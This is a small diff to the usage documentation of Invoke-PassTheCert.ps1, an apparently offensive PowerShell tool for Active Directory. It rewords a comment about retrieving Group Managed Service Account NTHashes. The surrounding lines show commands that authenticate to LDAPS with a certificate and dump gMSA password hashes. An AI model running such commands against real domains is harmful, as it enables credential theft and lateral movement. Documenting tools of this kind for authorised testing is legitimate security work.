@@ -96,7 +96,8 @@ Import-Module .\Invoke-PassTheCert.ps1
 $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
-# Read the ManagedPassword-related attributes (NTHash included) of the 'gmsad$' Group Managed Service Account (-Object switch is optional, hence retrieving every gMSAs' NTHashes)
+
+# Read the ManagedPassword-related attributes (NTHash included) of the 'gmsad$' Group Managed Service Account (Not specifying -Object allows to retrieve every gMSAs' NTHashes the certificate account has access to).
 Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'gMSA' -Object 'CN=gmsad,CN=Managed Service Accounts,DC=X'
 ```
 
